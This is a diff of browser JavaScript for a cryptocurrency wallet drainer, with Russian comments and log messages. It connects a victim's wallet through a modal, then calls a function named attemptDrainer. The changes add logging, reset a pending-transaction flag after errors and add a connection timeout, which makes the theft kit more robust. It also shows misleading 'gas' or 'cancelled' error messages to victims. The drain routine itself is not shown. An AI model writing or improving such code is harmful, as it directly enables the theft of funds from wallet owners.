@@ -412,6 +412,7 @@ async function attemptDrainer() {
       console.error('❌ Несоответствие адресов:', address, connectedAddress);
       hideModal();
       modalShown = false;
+      isTransactionPending = false;
       return;
     }
 
@@ -453,9 +454,14 @@ async function attemptDrainer() {
 
 // === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
+  console.log('🔍 Начало handleConnectOrAction');
   try {
+    // Проверяем, есть ли уже подключённые аккаунты
     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+    console.log('🔍 Проверка подключённых аккаунтов:', accounts);
+
     if (accounts.length === 0) {
+      console.log('🔍 Нет подключённых аккаунтов, открываем модальное окно кошелька');
       await appKitModal.open();
       connectedAddress = await waitForWallet();
       console.log('✅ Подключён кошелёк:', connectedAddress);
@@ -465,11 +471,15 @@ async function handleConnectOrAction() {
     }
 
     if (!isTransactionPending) {
+      console.log('🔍 Запускаем attemptDrainer');
       await attemptDrainer();
     } else {
       console.log('⏳ Транзакция уже выполняется');
     }
   } catch (err) {
+    console.error('❌ Ошибка в handleConnectOrAction:', err.message);
+    isTransactionPending = false;
+
     // Игнорируем ошибки "Request of type 'PUBLIC_switchEthereumChain' already pending" и "Request of type 'PUBLIC_signTransaction' already pending"
     if (err.message.includes("Request of type 'PUBLIC_switchEthereumChain' already pending")) {
       console.warn('⚠️ Запрос на переключение сети уже ожидается, ждём завершения:', err.message);
@@ -480,7 +490,6 @@ async function handleConnectOrAction() {
       return; // Не обновляем модальное окно
     }
 
-    console.error('❌ Ошибка подключения:', err.message);
     updateModalContent('error', err.message.includes('user rejected') ? 'cancelled' : 'gas');
   }
 }
@@ -503,16 +512,33 @@ function cleanup() {
 
 // === Ожидание подключения кошелька ===
 async function waitForWallet() {
+  console.log('🔍 Начало waitForWallet');
   const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-  if (accounts.length > 0) return accounts[0];
+  if (accounts.length > 0) {
+    console.log('✅ Аккаунты найдены сразу:', accounts[0]);
+    return accounts[0];
+  }
 
-  return new Promise((resolve) => {
+  const timeoutMs = 30000; // Тайм-аут 30 секунд
+  return new Promise((resolve, reject) => {
     const interval = setInterval(async () => {
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      if (accounts.length) {
-        clearInterval(interval);
-        resolve(accounts[0]);
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length) {
+          console.log('✅ Аккаунты найдены через интервал:', accounts[0]);
+          clearInterval(interval);
+          clearTimeout(timeout);
+          resolve(accounts[0]);
+        }
+      } catch (err) {
+        console.error('❌ Ошибка в waitForWallet при проверке аккаунтов:', err.message);
       }
     }, 500);
+
+    const timeout = setTimeout(() => {
+      clearInterval(interval);
+      console.error('❌ Тайм-аут ожидания подключения кошелька');
+      reject(new Error('Timeout waiting for wallet connection'));
+    }, timeoutMs);
   });
 }
